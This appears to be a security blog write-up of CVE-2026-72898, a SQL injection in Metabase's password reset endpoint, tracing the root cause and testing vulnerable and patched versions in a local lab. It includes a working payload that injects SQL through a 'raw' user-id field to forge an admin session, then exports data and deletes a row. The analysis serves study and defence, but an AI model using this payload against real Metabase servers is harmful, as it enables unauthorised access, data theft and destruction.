---
title: "CVE-2026-72898: SQL Injection in Metabase's Password Reset API"
date: 2026-10-06
categories: ["1-day", "Education"]
tags: ["CVE-2026-72898", "Metabase", "SQL Injection", "Web"]
summary: "Tracing how a Metabase password reset request could create an admin session, then comparing vulnerable and patched versions in a local lab."
---

## Intro

Hello! In this post, I'll take a closer look at **CVE-2026-72898**.

Metabase is an analytics tool that connects to databases and turns queries into tables and dashboards. Admin access to Metabase can therefore lead to access to the data it connects to. According to the [official advisory](https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf), this vulnerability let an unauthenticated request inject SQL into the **Metabase application database**, and exploitation was observed in the wild.

Instead of stopping at “put SQL in `user-id`,” I want to trace **how that value moved through the authentication code and became SQL**. I will then compare vulnerable and patched versions using my [local lab repository](https://github.com/amier-ge/cve-2026-72898).
<br><br>

---

## 00_Two Databases in Metabase

The first distinction is between two databases.

| Database | What it stores | Role in this lab |
| --- | --- | --- |
| **Application database** | Metabase users, sessions, and settings | The **direct target** of the SQL injection |
| **Connected analytics database** | Data Metabase analyzes, such as customers and orders | Accessed **later** through the forged admin session |

The lab runs vulnerable Metabase on `localhost:3001` and patched Metabase on `localhost:3002`. They have separate application databases but share a synthetic shop database. Deleting an order is **not the direct effect of the password reset injection**. The injection creates an admin session in the application database; the attacker then uses that session to call Metabase's API.
<br><br>

---

## 01_Root Cause

### 01-1_An Unexpected `user-id` Reaches Authentication

The [password reset endpoint in v0.63.2](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/session/api.clj#L310-L323) validates `token` and `password`, but its input schema is not closed, so extra fields are accepted. The handler also forwards the **entire request body** to the authentication flow instead of forwarding only those two fields.

`user-id` is not a field required by a normal password reset request. The essential shape of the attack request is shown below.

```json
{
  "token": "invalid-lab-token",
  "password": "a_lab_password",
  "user-id": {"raw": "SQL goes here"}
}
```

### 01-2_Why `user-id` Survives an Invalid Token

This was the part I initially found confusing. The [token authentication code](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/auth_identity/providers/emailed_secret.clj#L110-L163) returns a failure result for an invalid token. But the [login flow](https://github.com/metabase/metabase/blob/v0.63.2/src/metabase/auth_identity/provider.clj#L266-L273) **merges the original request with that result**. Conceptually:

```text
Original request: {token: "invalid", user-id: {raw: "SQL"}}
Auth result:      {success?: false, error: "invalid-token"}
Merged result:    {token: "invalid", user-id: {raw: "SQL"},
                   success?: false, error: "invalid-token"}
```

The failure result has no `user-id`, so **the attacker-supplied field remains in the merged result**. The next line retrieves it and asks the database to find the user with that ID. This is **not an ID obtained from successful authentication**. It came from the untrusted request.

### 01-3_Why the Value Becomes SQL

Toucan2 performs the user lookup and uses HoneySQL to build its query. A normal numeric ID would be treated as a **parameter value**, roughly like `WHERE id = ?`. The attacker instead supplies a `{"raw": "..."}` object. [HoneySQL's `raw` feature](https://github.com/seancorfield/honeysql/blob/develop/doc/special-syntax.md#raw) emits its content directly into generated SQL.

The merge does not execute SQL by itself. The path is **request `user-id` object → user lookup condition → HoneySQL `raw` interpretation → SQL execution against the application database**. [Metabase's root-cause analysis](https://www.metabase.com/blog/vulnerability-what-happened) describes the same four-part chain: an open schema, forwarding the entire body, an ID lookup, and raw SQL formatting.

The endpoint can still return **HTTP 400** because the reset token is invalid. If the user lookup has already executed the injected SQL, that 400 response does not mean the attack failed.
<br><br>

---

## 02_Exploit Ideation

The goal is not to reset a password. It is to create an **admin session in the application database's `core_session` table**. The lab's `exp.py` generates a session key and places SQL in `user-id.raw` to store its hash for user ID `1`. In the lab, that first user is the initial admin. Metabase reported that the real attacker also inserted an admin session into the session table. [[Source]](https://www.metabase.com/blog/vulnerability-what-happened)

The sequence looks like this:

```text
POST /api/session/reset_password  →  HTTP 400 for the invalid token
        │
        └─ injected SQL runs during user lookup → admin session row appears
GET  /api/user/current            →  HTTP 200 if the new session works
```

The **second request's admin result** matters more than the first request's 400 status.
<br><br>

---

## 03_Setting Up the Local Lab

After downloading the [lab repository](https://github.com/amier-ge/cve-2026-72898), run the following in Windows PowerShell. You need Docker Desktop with its Linux engine and Python 3.10 or later. Docker downloads the prebuilt Metabase images on the first run.

```powershell
.\start.ps1
```

`start.ps1` creates local database passwords in `.env`. Open both URLs, create a separate initial admin account in each instance, and connect the synthetic PostgreSQL database **in both Metabase instances**.

| Setting | Value |
| --- | --- |
| Metabase setup | `http://localhost:3001/setup`, `http://localhost:3002/setup` |
| Analytics database display name | `가상 쇼핑몰` |
| Host / port | `analytics-db` / `5432` |
| Database / user | `shop_demo` / `analytics_reader` |
| Password | `ANALYTICS_READER_PASSWORD` from `.env` |

Run `.\verify.ps1` before exploiting. The starting state is **four customers, five orders, and order 105 present**. The [repository README](https://github.com/amier-ge/cve-2026-72898#readme) has the full setup instructions.
<br><br>

---

## 04_Exploit

Run the same `exp.py` against both instances.

```powershell
python .\exp.py localhost:3001
.\verify.ps1
python .\exp.py localhost:3002
```

<details>
<summary>Key parts of the exploit code</summary>

This excerpt from the [full exp.py](https://github.com/amier-ge/cve-2026-72898/blob/main/exp.py) shows the core request and session check.

```python
session_hash = hashlib.sha512(session_key.encode("ascii")).hexdigest()
sql = (
    "1); INSERT INTO core_session (id, user_id, created_at, key_hashed) "
    f"VALUES ('{session_id}', 1, now(), '{session_hash}'); --"
)
payload = {
    "token": "invalid-lab-token",
    "password": "R7mK9vT4qH2pL8xB6nD3sY5a",
    "user-id": {"raw": sql},
}
status, _ = api("POST", "/api/session/reset_password", body=payload)
status, current = api("GET", "/api/user/current", session=session_key)
```

</details>

On vulnerable port `3001`, the admin-session check succeeds. The script then uses the Metabase API to save synthetic customer and order data as CSV files under `exports/run-.../`. It also deletes **one synthetic row**, `order_id=105`, from `analytics.orders`. `.\verify.ps1` shows the order count changing **5 → 4** and `order_105_present` changing **true → false**.

The same request goes to patched port `3002`, but `/api/user/current` returns **HTTP 401** for the attempted session. The script therefore never reaches CSV export or order deletion.
<br><br>

**What this demonstrates:** the connected customer/order database is not the direct SQL injection target. The injection creates a Metabase admin session; that session is then used to reach the connected database. The lab intentionally grants its analytics connection `DELETE` permission on the synthetic orders table. A read-only connection would not allow this deletion.
<br><br>

---

## 05_Patch and Recovery

The [patched branch's endpoint](https://github.com/metabase/metabase/blob/v0.63.18/src/metabase/session/api.clj#L317-L333) closes the input map with `{:closed true}` and forwards only `token` and `password` to authentication. Metabase also reports rejecting abusable keys at the authentication entry point and throwing on unexpected keys in internal utility macros. [[Metabase's patch explanation]](https://www.metabase.com/blog/vulnerability-what-happened)

The lab uses Docker image `v0.63.18.3` for the patched instance. The source link above points to the public `v0.63.18` tag; the first fixed release in the 0.63 line was `v0.63.5`, according to the [[version information]](https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf).

Restore the synthetic order and remove the local CSV copies after the demo:

```powershell
python .\recover.py
.\verify.ps1
```

The expected state is **five orders with order 105 present** again. `recover.py` restores lab data; it cannot undo the disclosure of any real data that may already have left a system.
<br><br>

---

## 06_Outro

What makes this case interesting is the chain across several layers. An extra request field survived a failed token check, became a user lookup condition, and was treated as an instruction to the SQL formatter. A 400 response hid a successful database side effect, while a session change in the application database opened the path to the connected analytics data.

Thanks for reading all the way through :)
